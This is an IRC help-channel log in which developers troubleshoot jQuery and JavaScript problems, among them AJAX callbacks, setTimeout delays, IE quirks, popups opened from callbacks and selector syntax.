[08:14:49] <blk_panther> thx!
[08:15:02] <Jon47> or .. make a wrapper function for making requests, that stacks up the current requests, and then whenever a request finishes it locks the queue, checks to see if there are any pending requests, and adds one to the stack
[08:15:12] <freeed> Jon47... good idea.. something like that would be a lot sleeker..
[08:15:25] <Wiggin> freeed: I meant to recurse with setTimeout instead of waiting for requests to finish but if efficiency matters significantly then I don't know :P
[08:15:35] <Jon47> efficiency always matters!
[08:15:35] <mysphyt> freeed: If you use a recursive function then each of your setTimeouts will be nested within one another.
[08:16:10] <freeed> mysphyt, I saw an example like that also.. basically just keep calling itself every second.. the logic behind that just seems.. ug.. but looking like its going to end up being a solution like that
[08:16:35] <mysphyt> freeed: Good old CSCI 101 recursion.  It's not fancy, but it'll do the job.
[08:17:01] <mysphyt> freeed: And to me it was the only elegant way to deal with nested callbacks.
[08:17:11] <Wiggin> heh am I the only one who thinks recursion is an elegant way to solve problems?
[08:17:14] <freeed> mysphyt... ahh. ok. Well... thanks guys, you've all given me some good ideas.. gonna write some psuedo code and figure this out
[08:17:28] <aLinux> the firefox-web-console doesn't print much info like firebug console , why is this ?
[08:17:31] <progme> Wiggin: no
[08:18:04] <mysphyt> Wiggin: Recursion is elegant.  It just also leads to unclear logic sometimes.
[08:18:09] <Jon47> yeah recursion is definitely elegant and powerful, but like all powerful technologies it can be misused
[08:18:19] <mysphyt> "Goto" is sometimes elegant, too.
[08:18:23] <firebelly> have what i'm sure is an easy fix, driving me a bit bonkers: https://gist.github.com/970719
[08:18:44] <firebelly> simply trying to display the correct fieldset based on text value of an option
[08:18:54] <firebelly> works in all browsers but (gasp) IE
[08:19:07] <freeed> mysphyt, exactly.. jquery has really gotten me to write scripts that can actually be human readable and logical.. the whole setTimeout / call another function is just kind of ugly :p
[08:19:43] <mysphyt> freeed: Yup.  The one thing jQuery (and javascript in general I think) does not make much easier is sequencing.
[08:20:09] <freeed> well it's all single-threaded at it's code right?
[08:20:13] <freeed> core*
[08:20:44] <oDesk> why ".load()" ed contents with anchors , when anchor clicked the link loads into the same loaded css class
[08:22:08] <oDesk> actually that class created at runtime
[08:22:53] <oDesk> even i set anchor target to _top
[08:23:51] <amh345> does anyone have any script recommendations for a multi-level navigation bar?
[08:25:24] <firebelly> so, does "change" still behave erratically in IE7+ and jquery1.5.x?
[08:26:18] <mustefaj> how do you force delay in jquery?
[08:26:31] <mustefaj> just do a timeout for like 1000 mili second before processing
[08:26:46] <Raverix> setTimeout(code, delay)
[08:27:02] <Raverix> Not jquery, standard javascript.
[08:27:21] <Raverix> setTimeout($('#main').hide, 1000);
[08:27:34] <mustefaj> will it delay no code?
[08:27:58] <Raverix> Or you could do setTimeout(function(){ $('#main').hide(); }, 1000);
[08:28:13] <Raverix> No, it won't delay your code.
[08:28:34] <Raverix> Why would I tell you to use 'setTimeout' in response to 'how do you force delay in jquery' if it didn't do that?
[08:29:33] <mustefaj> Raverix, instead of sounding like a smart alec you can ask for me to communicate more effectively, cheers mate
[08:31:11] <Raverix> I'll stick with the de facto standard dmart ass responses.
[08:31:15] <mysphyt> mustefaj: What do you mean by "delay no code?"  What would it look like to delay a noop?
[08:31:59] <mustefaj> dmart: Raverix :p
[08:32:10] <mustefaj> mysphyt, i'd just like to set a delay before the next lines are called
[08:32:30] <mustefaj> i don't want to throw a function or anything into setTimeout()
[08:32:36] <Raverix> You're talking about a sleep function.
[08:32:37] <mysphyt> mustefaj: Yeah, JS doesn't really work that way.
[08:32:42] <hornairs> does anyone know if qunit runs tests in parallel or not? random order?
[08:32:47] <Raverix> Javascript does not work that way by default, but you can make it work with a sleep function
[08:32:55] <hornairs> i'm finding that my setup function fires twice before a teardown function is run
[08:33:03] <mustefaj> yeah, that sounds too hacky
[08:33:13] <Raverix> It is, you shouldn't do it.
[08:33:18] <mysphyt> Okay.  I should stop trying to help with other people's work and do my own.
[08:33:22] <Raverix> The correct way, is as I showed above, setTimeout.
[08:33:23] <mustefaj> lol
[08:33:54] <mysphyt> mustefaj: If you're talking about jQuery elements in particular, though, there is an element.delay(time) method that might help you.
[08:34:18] <mysphyt> (As in, if you were doing what Raverix mentioned above, you could instead do $('#main').delay(1000).hide()
[08:34:18] <Raverix> That only works with animations, AFAIK.
[08:34:38] <mustefaj> hmm ok. thanks guys i think i can jquery docs it from there
[08:34:49] <mysphyt> Raverix: Yes, but I don‚Äôt know what he's doing.  So I thought it might be worth mentioning.
[08:34:54] <quicksilver> well it works with things that go into the FX queue
[08:34:59] <quicksilver> which is mostly, but not entirely, animations
[08:35:06] <mysphyt> Arright.  Off to deal with plagiarizing students.
[08:35:06] <quicksilver> and there are ways to force stuff into the FX queue
[08:35:11] <quicksilver> but, it's a stupid thing to do :)
[08:35:14] <Raverix> Indeed.
[08:35:19] <quicksilver> setTimeout is plain javascript and easy to use.
[08:35:22] <Raverix> And if you read the jQuery docs, they say to use setTimeout.
[08:35:51] <oDesk> [SOLVED] just made specific about the region applied the .click event into it.
[08:36:03] <Raverix> But if you wanted to be a jackass, you could do something like $('#main').delay(1000).animate({onComplete:function(){   $('#main').hide()    }});
[08:36:56] <firebelly> https://gist.github.com/970719 -- is this an issue with the change event in IE, or am I missing something really obvious? works in other browsers.
[08:37:37] <Michael> firebelly, Does it work when you tab out after changing in IE?
[08:37:46] <firebelly> hm
[08:38:16] <firebelly> Michael: nope, still getting "Object doesn't support this property or method"
[08:38:18] <Michael> Although on a select box it shouldn't matter
[08:38:21] <Michael> What line?
[08:38:26] <Michael> Get the IE script debugger
[08:38:30] <rpflo> hornairs: I think setup runs every test
[08:38:31] <Michael> It'll make you happier
[08:38:43] <firebelly> Michael:  yeah, it won't load the source, pleasantly enough ;)
[08:38:56] <Michael> Is there a URL you can show?
[08:38:59] <hornairs> rpflo it definitely does, but my problem is that it fires twice before a teardown is run
[08:39:03] <Michael> And what IE version
[08:39:14] <hornairs> i'm trying to mock some objects and then return them to the original state each setup and teardown
[08:39:29] <firebelly> Michael: 7 and 8 currently both show the issue. The URL is secured/login only.
[08:39:35] <Michael> firebelly, What if you change it to $(this)[0].selectedIndex ?
[08:39:37] <hornairs> but because they run out of order the mocked version is left at the end instead of the original, which screws up things later
[08:39:50] <mightym> hey guys, im new to jquery and playing arround with $.post() and $.ajax() ... i have a strange problem, when opening this http://pastie.org/1897211 file on my local machine i get an alert of my returning json object. but when calling this file on a server (i tried serveral, with several ports) i dont get an alert with the json data
[08:40:04] <hornairs> and it seems to be non deterministic
[08:40:07] <aLinux> 		var take={nm_username: temp1, nm_password: temp2};
[08:40:08] <aLinux> 		$.post("Display_Ajax.php",take,function(prm){
[08:40:08] <aLinux> 			alert(take);
[08:40:15] <aLinux> how can i print the whole json array ?
[08:40:21] <firebelly> Michael: giving that a shot; seems odd though
[08:40:21] <aLinux> alert print [object Object]
[08:40:40] <Michael> firebelly, I'm blind debugging :)
[08:40:43] <Michael> Odd is an understatement
[08:40:52] <rpflo> hornairs: hmm, I haven't used teardown so I guess I'm of no help :(
[08:40:59] <mightym> and charles also returns a response with the json object
[08:41:05] <Michael> firebelly, Side note - use text, not match. It's faster
[08:41:06] <firebelly> Michael: hear that! wish the client would pay for staging.....
[08:41:07] <Michael> er test
[08:41:09] <ralphholzmann> mightym try using $.getJSON
[08:41:18] <Michael> firebelly, /school/.test(type)
[08:41:22] <rpflo> aLinux: use console.log instead of alert?
[08:41:35] <mightym> ralphholzmann: i have to use post
[08:42:13] <Michael> brb meeting
[08:42:33] <ralphholzmann> $.ajax({ url: 'http://138.65.51.333/jsonservice.php', 'type' : 'post', 'dataType' : 'json', success: function( data ) { console.log( data ) }});
[08:42:38] <ralphholzmann> mightym ^^
[08:43:27] <mightym> ralphholzmann: ill try it, but ill quess still the same, wait =)
[08:45:12] <mightym> jep, still the same, works local, but not online
[08:45:36] <mightym> but thx anyway, ill keep on trying ;)
[08:47:08] <aLinux> var take={nm_username: temp1, nm_password: temp2};  $.post("Display_Ajax.php",take,function(prm){ if i don't use the var take=.. line then is it possible to alert or console.log the value of password ?
[08:48:19] <aLinux>   $.post("Display_Ajax.php",{nm_username: temp1, nm_password: temp2},function(prm){  now is it possible to print/alert/console.log( the value of password ?
[08:56:55] <gnarf> aLinux: I think so
[08:57:01] <gnarf> aLinux: but its not going to be easy
[08:57:14] <gnarf> aLinux: its easier if you store the variable you pass in as data
[08:57:30] <gnarf> I think `this.data` is going to be a string representation of the object
[08:57:41] <gnarf> it would also be available as "temp2"
[08:59:10] <gnarf> aLinux: if you used the $.ajax({ url: "Display_Ajax.php", data: {...}, usersPassword: temp2 }).done(function() { console.log(this.usersPassword); });
[09:00:36] <aLinux> gnarf: undefined
[09:00:55] <gnarf> aLinux: is "this" the options?
[09:01:04] <gnarf> console.dir() it
[09:03:07] <aLinux> gnarf: how? console.dir(this)  ; is it ?
[09:03:16] <gnarf> yeah
[09:03:24] <gnarf> it should give you like a tree view of the object
[09:03:28] <gnarf> what is it?
[09:04:19] <aLinux> gnarf: i got , data
[09:04:25] <aLinux>  "nm_username=user1&nm_password=pppuser666"
[09:04:31] <aLinux> data         "nm_username=user1&nm_password=pppuser666"
[09:05:30] <gnarf> aLinux: http://jsfiddle.net/gnarf/eRfKD/
[09:05:42] <gnarf> aLinux: as i said, data gets converted to a string
[09:06:02] <gnarf> aLinux: but if you store something on the "options" object for $.ajax()
[09:06:12] <gnarf> you can access it via "this" in the callback
[09:06:39] <gnarf> aLinux: however, assuming the functions are in the same scope... temp2 should still point at that same value....
[09:06:55] <aLinux> gnarf: :)
[09:08:54] <gnarf> aLinux: http://jsfiddle.net/gnarf/eRfKD/
[09:11:23] <diegoviola> hi
[09:11:53] <diegoviola> i'm doing an ajax request, and i'm getting html back, how do i tell jquery to insert this html replacing everything i have on the page?
[09:12:24] <diegoviola> (just as a test)
[09:12:40] <firebelly> Michael: [SOLVED] this is probably not new, but my error was due to IE not implementing str.trim() (really? jeeez....)
[09:12:49] <diegoviola> or how to open the html that is being returned in a new page?
[09:12:49] <firebelly> https://gist.github.com/970719
[09:12:58] <Michael> firebelly, Oh, interesting. Good catch
[09:13:09] <Ari-Ugwu> diegoviola,  $(selector).replaceWith(html)
[09:13:12] <m0dmd> has anyone experienced failure with window.load or location.reload in ajax success?
[09:13:21] <m0dmd> works outside of the ajax, but not inside.
[09:13:32] <diegoviola> Ari-Ugwu: thanks
[09:13:49] <m0dmd> Trying to get a value from from the response and use it in window.load
[09:14:59] <JakeSays> does jquery templates not support expressions line this? {{if NumberOfGenerations == -1}}
[09:16:50] <wkmanire> Howdy folks.
[09:16:51] <Aamir> http://jsfiddle.net/aamir/wd5Cy/1/ Why jQuery add margin-left to the position().left :(
[09:17:04] <phlp> JakeSays: http://api.jquery.com/template-tag-if/
[09:17:33] <JakeSays> phlp: i read that
[09:17:44] <JakeSays> it didnt help
[09:18:59] <wkmanire> phlp: Nice link! I hadn't seen that yet.
[09:20:16] <Klevre> How do figure out if an element loses focus?
[09:20:36] <JakeSays> so to say {{if}} supports expressions is stretching the truth a bit
[09:20:45] <wkmanire> Kleve: Handle the blur event
[09:26:02] <m0dmd> got it
[09:26:07] <m0dmd> async: false to the rescue
[09:26:20] <wkmanire> m0md: are you sure?
[09:26:33] <wkmanire> Are you doing an ajax request?
[09:26:39] <JakeSays> async: false rarely rescues anything
[09:26:59] <m0dmd> yea
[09:27:09] <wkmanire> m0dmd: Some browsers simply do not support asynchronous ajax.
[09:27:10] <m0dmd> it's an ajax call just to get an id.
[09:27:19] <wkmanire> blah
[09:27:23] <wkmanire> I said that wrong
[09:27:27] <wkmanire> *synchronous*
[09:27:40] <m0dmd> hmmmm!
[09:27:51] <wkmanire> For instance, I don't think its possible to do a synchronous XHR in firefox.
[09:28:01] <m0dmd> i'm testing in firefox and it works
[09:28:16] <wkmanire> jQuery might be using deferreds to do that.
[09:28:27] <m0dmd> alright.
[09:28:31] <m0dmd> let me try to do it another way.
[09:29:08] <wkmanire> m0md: At any rate, when we did XHR requests synchronously in the past it had a tendancy to lock the browser until the request came back from the server.
[09:29:32] <wkmanire> m0md: So if you had  a server issue and a long timeout period you could give the user the impression that you're site has crashed their computer.
[09:29:39] <wkmanire> your*
[09:29:45] <JakeSays> wkmanire: yup. same experience here.
[09:30:43] <JakeSays> so.. jquery templates, while nice, seems to be lacking. are there other, similar, templating engines around?
[09:30:44] <phlp> JakeSays: http://jsfiddle.net/DMDBG/
[09:30:57] <m0dmd> wkmanire check it out http://jsfiddle.net/CngCV/
[09:31:26] <m0dmd> the ajax request does not update the var on it's first run but on the second.
[09:31:42] <JakeSays> phlp: hmm
[09:31:46] * wkmanire is looking.
[09:31:48] <m0dmd> I need that value to use in the window.load ...
[09:32:40] <wkmanire> m0dmd: Ok, it is actually happening both times
[09:32:59] <m0dmd> yes it happens, but note_id returns undefined the first time
[09:33:00] <wkmanire> That conditional (if (note_id....)) is firing immediately after your ajax request
[09:33:12] <wkmanire> its not waiting
[09:33:14] <lenswipe> hey guys
[09:33:16] <lenswipe> Cork sup
[09:33:21] <m0dmd> yea whatcha recommend bud
[09:33:31] <m0dmd> the window.load isn't working in the success of the ajax call
[09:33:41] <wkmanire> in asynchronous mode that ajax request is going to go away on a seperate "thread" until the request is responded to by the server.
[09:34:02] <wkmanire> you need to continue your process in the success callback function.
[09:34:14] <wkmanire> I see you are trying to do a redirect using an ajax request?
[09:34:15] <m0dmd> window.load() isn't functioning in the success callback
[09:35:03] <m0dmd> if window.load() is called a redirect, yep. But it's a new tab that needs to be opened
[09:35:21] <m0dmd> Normally a redirect would refer to redirecting the current page.
[09:35:23] <lenswipe> wkmanire i have some jquery that works on my dev server, but not on my production server - any ideas?
[09:35:28] <m0dmd> I'm trying to load a new page.
[09:35:31] <lenswipe> wkmanire its exactly the same code
[09:35:51] <m0dmd> lenswipe develop it on the production server.
[09:36:02] <lenswipe> m0dmd i cant, i shant, and i wont.
[09:36:10] <wkmanire> m0dmd: thats probably a worst practice.
[09:36:10] <m0dmd> That's not smart.
[09:36:13] <wkmanire> well, probably not probably.
[09:36:20] <lenswipe> m0dmd what wkmanire said
[09:36:21] <m0dmd> sometimes production servers aren't the same as local servers.
[09:36:28] <lenswipe> it would seem not
[09:36:34] <m0dmd> and worst practice is if your production server is live.
[09:36:41] <m0dmd> Create a test env.. on the production server.
[09:36:46] <lenswipe> it is live otherwise it wouldnt be a production server
[09:36:58] <wkmanire> ok guys, this is a silly debate
[09:37:04] <m0dmd> But you said dev server. rofl
[09:37:04] <lenswipe> yes it is
[09:37:11] <eddiemonge> ?gallery
[09:37:20] <lenswipe> eddiemonge ?clarification
[09:37:25] <wkmanire> lenswipe: What is going on in your javascript in dev that isn't working in live?
[09:37:27] <eddiemonge> oi bot-t is never around when i need him
[09:37:37] <lenswipe> wkmanire want me to pastebin?
[09:37:40] <wkmanire> please
[09:37:50] <lenswipe> wkmanire http://openpaste.org/27600/inline/
[09:37:52] <jamesdean77> How do you make a function global in jQuery
[09:37:53] <wkmanire> m0dmd: You want to load a popup or reload the current page?
[09:37:59] <m0dmd> load a new tab.
[09:38:09] <jamesdean77> window.functionName ?
[09:38:13] <wkmanire> browser tab not jquery-ui tab right?
[09:38:14] <lenswipe> wkmanire whats especially interesting is that the post request returns: "POST http://feedr.57o9.org/ajax/feedchecks.html undefined (undefined)"
[09:38:16] <jefflembeck> anybody have any experience with .play() on an audio tag? I have a loading pop up that I want to call when the button that fires that is pushed and I want it to stop when the playing actually starts
[09:38:17] <m0dmd> yep
[09:38:25] <m0dmd> I thought window.load did that.
[09:38:53] <ravenzz> lenswipe you can't go cross-domain ..if that's what you are trying to do
[09:38:58] <lenswipe> im not
[09:38:58] <wkmanire> m0dmd: window.open
[09:39:07] <lenswipe> ravenzz im not trying to go cross domain
[09:39:09] <wkmanire> lenswipe: looking
[09:39:14] <lenswipe> wkmanire ok
[09:39:36] <wkmanire> jamesdean77: If you want to extend jquery with a function you can use jQuery.fn.myNewFunctino
[09:39:45] <wkmanire> jamesdean77: check out the plugin authoring docs on jquery.com
[09:39:46] <m0dmd> rofl
[09:40:15] <lenswipe> damn
[09:40:17] <lenswipe> what a nickname
[09:40:24] <wkmanire> whoooooo!
[09:40:27] <lenswipe> i red jfelchner as "jfelcher"
[09:40:31] <m0dmd> wkmanire thankx man
[09:40:47] <m0dmd> So two different functions that function in the same manner is it?
[09:41:01] <JakeSays> phlp: http://jsfiddle.net/DMDBG/1/ - doesnt work. what am i doing wrong?
[09:41:06] <wkmanire> lenswipe: I can see your code is trying to post but I don't see the url because it hasn't been resolved in your pastie.
[09:41:12] <jamesdean77> @wkmanire I just wrote a lil funtion no need for a plugin
[09:41:17] <lenswipe> wkmanire want me to paste the HTML?
[09:41:21] <JakeSays> phlp: ah shit. n/m.
[09:41:22] <lenswipe> after PHP has finished with it
[09:41:26] <JakeSays> forgot a closing }
[09:41:27] <m0dmd> wkmanire i'm confused. It was not working and now it's working.
[09:41:38] * wkmanire pulls out his last hair.
[09:41:39] <m0dmd> Wow, thanx though bud
[09:41:50] <JakeSays> phlp: thanks for your help!
[09:41:54] <wkmanire> Sorry guys, my 1 year old his crying. brb
[09:42:05] <phlp> JakeSays: np :)
[09:42:10] <m0dmd> congratulations on the 1 year old edition :)
[09:44:28] <jeffsmykil> im kicking back an error with this line
[09:44:28] <jeffsmykil>             if ($(this).hasClass("equipmentMenuOption")
[09:45:29] <wkmanire> m0dmd: Thanks!
[09:45:44] <wkmanire> lenswipe: Where is it failing in your code?
[09:45:54] <amh345> is there a fast way to check if jquery is functioning using firebug?
[09:45:56] <wkmanire> lenswipe: Have you stepped through it in your debugger yet?
[09:46:35] <wkmanire> amh345: do console.log(jQuery("body").length);
[09:46:44] <wkmanire> amh345: Should generally print 1
[09:47:06] <amh345> wkmanire: i get 1 followed by undefined
[09:47:19] <wkmanire> really?
[09:47:34] <amh345> yes. using console.log(jQuery("body").length);
[09:47:37] <wkmanire> that seems odd.
[09:48:26] <lenswipe> wkmanire i think its the post request
[09:49:04] <ravenzz> jeffsmykil you miss a ) ? :p
[09:49:08] <m0dmd> alright wkmanire that doesn't work. I had async still set to false by mistake
[09:49:19] <jeffsmykil> probably
[09:49:36] <jeffsmykil> yup
[09:49:40] <jeffsmykil> man i make stupid mistakes
[09:49:46] <ravenzz> np
[09:49:50] <m0dmd> meaning the window.open is not working in the success callback.
[09:49:52] <wkmanire> m0dmd: Gimme a minute and I'll get right back to you.
[09:49:57] <m0dmd> you got it bud
[09:50:12] <wkmanire> lenswipe: Alright, set a breakpoint int hat anon success function.
[09:50:29] <wkmanire> if your breakpoint doesn't hit, switch to the $.ajax syntax so you can get at each of the ajax callback handlers and see where you are getting held up.
[09:50:41] <indiefan2a> is there a way to have a callback be executed for every single .load() call without going through and adding it to every existing one?
[09:50:55] <lenswipe> wkmanire how do i do that?>
[09:51:03] <wkmanire> lenswipe: Which part?
[09:51:17] <lenswipe> wkmanire all of it, i dont understand what you're asking me to do
[09:51:30] <wkmanire> indiefan2a: http://api.jquery.com/ajaxComplete/
[09:51:43] <wkmanire> lenswipe: Do you know how to use firebug or chrome developer tools?
[09:51:52] <lenswipe> wkmanire yes
[09:52:16] <wkmanire> lenswipe: Your $.post call is getting passed an anonymous callback function to be executed upon success of the post.
[09:52:23] <lenswipe> ok
[09:52:26] <wkmanire> Set a break point in that anonymous function to make sure it is getting called.
[09:52:29] <phlp> m0dmd: are you sure the popup isnt being blocked? unless it's from direct user action (in the click) it might not open
[09:52:59] <wkmanire> If it doesn't get called, we'll use the full $.ajax function call and specify callback handlers for error, complete and success that way we can see where the problem is happening.
[09:53:17] <lenswipe> wkmanire and i dont know how to do that
[09:53:32] <ravenzz> http://api.jquery.com/jQuery.ajax/
[09:54:14] <wkmanire> $.post is just a convenient helper function for doing an $.ajax call with {type: "POST"}
[09:54:28] <lenswipe> i still dont understand what you want me to do
[09:54:34] <ravenzz> gh
[09:54:56] <amh345> <ul id="nav">blah</ul>  and $(" #nav ul ").css({display: "none"});   is throwing "$(" #nav ul ") is null"   is there an obvious reason this is happening?
[09:54:58] <wkmanire> lenswipe: Start off by reading the doc that ravenzz sent ya :)
[09:55:03] <lenswipe> *sigh*
[09:55:07] <TonkaTruck> ajpiano: Did you see the new behance/prosite app?  Ton of jquery/ui stuff.
[09:55:14] <lenswipe> nevermind ill figureit out myself
[09:55:24] <ravenzz> you should add something (the breakpoint) to the callback..to check if it is going to be executed
[09:55:26] <jefflembeck> amh345 ul#nav
[09:55:39] <wkmanire> lenswipe: I'm trying to help you debug the issue as opposed to debugging it for you.
[09:55:53] <lenswipe> ravenzz a breakpoint being something like an alert box?
[09:56:01] <lenswipe> so i can see what is being executed?
[09:56:03] <ravenzz> put an alert('i love you jesus')
[09:56:11] <wkmanire> ooooh, that was mean
[09:56:12] <ravenzz> that's a kind of breakpoint
[09:56:13] <ravenzz> lol
[09:56:16] * wkmanire chuckles.
[09:56:36] <amh345> jefflembeck:  same this "$("ul#nav") is null"
[09:56:48] <lenswipe> yeah my breakpoint isnt firing
[09:56:50] <wkmanire> lenswipe: A breakpoint, in the sense that we're talking about, is a marker on a line of code that tells your debugger to pause execution whent hat line is reached.
[09:56:58] <wkmanire> that*
[09:57:08] <ravenzz> lenswipe ok, so now you must replace your $.post request with $.ajax
[09:57:09] <diegoviola> is there a way to open the html response from an ajax request in a new window, so i can compare with the actual one?
[09:57:13] <m0dmd> wkmanire google chrome actually blocks async: true popups and opens async: false
[09:57:19] <ravenzz> lenswipe look at http://api.jquery.com/jQuery.ajax/ for examples
[09:57:20] <jefflembeck> so i've come to the point where I can call a $.get for the audio file, and when it is loaded, it plays and the loading stops, but... if I've already been on that page, it is in the browser cache already, how do I check if an audio file has already been loaded into the browser cache?
[09:57:22] <phlp> amh345: is it inside $(document).ready(function() { ... });
[09:57:41] <m0dmd> my site is using chrome frame so i don't care for IE users.
[09:57:43] <search4answers> I have a DIV with 5 UL in it... if I div.removeChild() on 2 of the UL (so I have 3 left), then $("#div-name > ul") still returns 5 UL ... how can I refresh jquery so it sees that I have removed 2 of them?
[09:58:17] <wkmanire> m0dmd: Ok. I had no idea about that one.
[09:58:22] <amh345> phlp: it's not.  it's inside a function mainmenu(){ }  and after the function there a document ready function with mainmenu();
[09:58:29] <wkmanire> m0dmd: So chrome doesn't want to allow you to create popups in a callback handler?
[09:58:40] <diegoviola> any ideas please?
[09:58:41] <m0dmd> it's not allowing it with firefox
[09:58:45] <m0dmd> with async: true
[09:58:47] <amh345> it's working on this guys site.  so im lost http://www.kriesi.at/wp-content/extra_data/suckerfish_tutorial/step4.html
[09:59:00] <m0dmd> but when i use async: false Chrome works, safari, mozilla
[09:59:07] <m0dmd> n opera
[09:59:22] <astropirate> Is it possable to make ajax requests cross domain?
[09:59:41] <ravenzz> astropirate with jsonp
[09:59:49] <m0dmd> astropirate Cross-domain requests and dataType: "jsonp" requests do not support synchronous operation.
[10:00:04] <ravenzz> or using some kind of php proxy hostend in your local webserver
[10:00:15] <ravenzz> -d +t
[10:00:39] <wkmanire> ravenzz: Boy I'm glad you logged. The questions have been non-stop since I got here.
[10:00:40] <phlp> amh345: are you sure jquery is loaded?
[10:00:40] <wkmanire> he he he
[10:00:50] <astropirate> ravenzz, m0dmd, thanks
[10:01:00] <tman> if i have 2 classes on an element like so:
[10:01:01] <tman> $(".brandToggler").not('.active').hover(function() {
[10:01:11] <tman> how come it ignores the not in the chain?
[10:01:13] <ravenzz> wkmanire unfortunatly i'm not a guru and a good english speaker :P
[10:01:26] <wkmanire> ravenzz: Neither am I, and English is my first langauge.
[10:01:29] <tman> ie, <div class="brandToggler active">
[10:01:38] <m0dmd> np
[10:01:45] <amh345> phlp: when i ran console.log(jQuery("body").length); it returns a 1 followed by undefined.  so i think it is.  and when i have alert('blah'); inside the document ready function i do see the alert.
[10:01:46] <wkmanire> m0dmd: Let me get a little test env set up here so I can reproduce this.
[10:02:16] <TonkaTruck> Is addy osmani in here? I can't remember his nick...if it's not addyosmani.
[10:02:50] <lenswipe> wkmanire stranger and stranger
[10:03:03] <lenswipe> wkmanire if i paste in my js into the console, the js on the page starts working
[10:03:07] <search4answers> I call removeChild on element but jquery still returns that element when I query, help?!
[10:03:18] <m0dmd> wkmanire no stress bud. don't worry man you got the baby to look after :)
[10:03:28] <m0dmd> my research also returned http://jsfiddle.net/A6JMb/
[10:03:55] <wkmanire> m0dmd: Thanks for your understanding.
[10:03:58] <m0dmd> I found a few documented issues with window.open() in ajax callbacks
[10:04:04] <amh345> phlp: here is a jsfiddle of it http://jsfiddle.net/M63vU/   doesnt appear to work there either
[10:04:08] <ravenzz> tman $('.brandToggler:not(".active")').hover() ?
[10:04:36] <m0dmd> I know how it feels man, my baby girl will be 2 in a coulpe months
[10:04:41] <m0dmd> couple*
[10:04:55] <wkmanire> m0dmd: Awesome :)
[10:05:07] <wkmanire> m0dmd: Ok, so lets talk about why you want to do this in the first place.
[10:05:14] <tman> oh
[10:05:15] <tman> lemme try
[10:05:32] <m0dmd> oh yea let me explain briefly
[10:05:49] <m0dmd> I have a note taking app and the user has to select a date before creating the note.
[10:06:25] <tman> raven same effect
[10:06:32] <m0dmd> And using jquery datepicker opens in a popup, and I have my ajax creating the note and returning the id to then be used in the editor in a new window.
[10:07:03] <m0dmd> I can create the note_id from the editor page if I wanted to as well.
[10:07:26] <m0dmd> But I choose to create the note once the user clicks the submit button after selecting the date of the note.
[10:07:27] <lenswipe> wkmanire i fixed it- it was because one of my controllers was printing out $_POST
[10:07:34] <wkmanire> :)
[10:07:34] <ravenzz> tman http://jsfiddle.net/SjCDM/
[10:07:41] <ravenzz> hover on bar
[10:08:03] <wkmanire> m0dmd: So you want the user to pick a date in the popup which is returned to the parent window?
[10:08:18] <m0dmd> Nope, it's not returned, it just refreshes :)
[10:08:45] <wkmanire> m0dmd: Have you considered displaying the datepicker in a jQuery dialog?
[10:08:46] <m0dmd> Keep it really simple for now. As I'm the only programmer
[10:09:29] <wkmanire> They're super easy to use and don't suffer the same kinds of problems that popups do, although it is not truly a popup most users can't tell the difference unless presented the two side by side.
[10:09:37] <phlp> amh345: http://jsfiddle.net/M63vU/1/ your lists were nested wrong
[10:09:40] <m0dmd> wk I have no popups :)
[10:09:44] <m0dmd> It's just a hidden div!!
[10:10:06] <tman> ravenzz: thank yopu very much, lemme check my syntax.
[10:10:17] <wkmanire> m0dmd: Can I see the page+script?
[10:12:41] <toastyghost> does anybody know if there's an equivalent to jsperf.com for php code?
[10:13:00] <m0dmd> wkmanire http://pastebin.com/jqswGhkv
[10:13:52] <ravenzz> i have to go
[10:13:53] <ravenzz> bye
[10:13:53] <m0dmd> wkmanire let me know how you'd clean up the jquery if you see better ways :)
[10:13:56] <m0dmd> lata ravenzz
[10:14:33] <wkmanire> Ok
[10:14:38] <wkmanire> Have you ever heard of Smarty?
[10:14:54] <wkmanire> Its a templating engine for PHP, it helps you get that PHP out of your markup.
[10:15:03] <m0dmd> yea
[10:15:28] <m0dmd> But I'll be using cakePHP when I'm ready
[10:15:33] <wkmanire> ah ok.
[10:16:17] <wkmanire> ahhh I see something
[10:16:33] <wkmanire> m0dmd: Change that input type="submit" to input type="button"
[10:16:41] <m0dmd> ok
[10:16:44] <wkmanire> otherwise your ajax call may not get a chance to come back before the form submits.
[10:17:22] <m0dmd> alright turned it into a button
[10:17:57] <jeffsmykil> is child not the equivalent to parent?
[10:18:14] <m0dmd> jefflembeck a parent can have a child
[10:18:20] <m0dmd> a child cannot have a child
[10:18:35] <m0dmd> i'm dead wrong
[10:18:36] <wkmanire> thankfully
[10:18:36] <m0dmd> :?)
[10:18:46] <m0dmd> in the case of jquery though
[10:18:46] <m0dmd> heh
[10:18:56] <m0dmd> the parent is the container
[10:19:13] <ccmonster> hey guys, im having trouble parsing this json.
[10:19:17] <ccmonster> it's really bugging me out.
[10:19:33] <m0dmd> ccmonster console.log(your_json)
[10:19:38] <jeffsmykil> is it not child()?
[10:19:39] <m0dmd> see what happens
[10:19:51] <ccmonster> i have been.
[10:20:29] <ccmonster> I get undefined, but it's there.
[10:20:51] <m0dmd> jsfiddle
[10:21:28] <ccmonster> the json is writing out in objects inside console
[10:21:32] <ccmonster> it wont do a strip output of it.
[10:21:37] <jeffsmykil>  var test = $("#" + whichWidget + ":nth-child(3)" ).attr('class');
[10:22:18] <search4answers> how do i get only the divs that are direct descendants of a container
[10:22:24] <gnarf> jeffsmykil: huh?
[10:22:37] <gnarf> jeffsmykil: you prolly want a space before the :nth-child
[10:22:37] <wkmanire> Sorry for the delay folks. $("wkmanire child:first") just did a $.post() and I had to $('#diaper").replace()
[10:22:38] <search4answers> i am doing $("#container div.highlighted") but it is returning a bunch of sub-divs as well
[10:23:10] <wkmanire> he he
[10:23:17] <jeffsmykil> gnarf: that's weird
[10:23:19] <jeffsmykil> why is that?
[10:23:23] <ccmonster> my original data is xml
[10:23:31] <ccmonster> and i used xml2json to convert it
[10:23:34] <phlp> search4answers: maybe you want $("#container > div.highlighted")
[10:23:34] <wkmanire> m0dmd: Ok, changing that input to a button had what effect?
[10:23:56] <gnarf> jeffsmykil: well "#id:nth-child(3)" will select #id if it is the 3rd child of its parent, but not otherwise
[10:24:01] <gnarf> i doubt thats what you wanted
[10:24:24] <gnarf> "#id :nth-child(3)" selects any element that is a 3rd child inside of #id
[10:24:26] <gnarf> close
[10:24:27] <gnarf> r
[10:24:38] <jeffsmykil> huh so its not like css in that regard
[10:24:40] <gnarf> "#id > :nth-child(3)" would select the 3rd child of #id
[10:24:51] <gnarf> jeffsmykil: that is exactly like css
[10:24:51] <search4answers> oh cool i forgot about that thx phlp
[10:25:11] <jeffsmykil> I wouldnt put a space in there for css
[10:25:20] <m0dmd> wkmanire didn't really matter because I don't have it inside a form :)
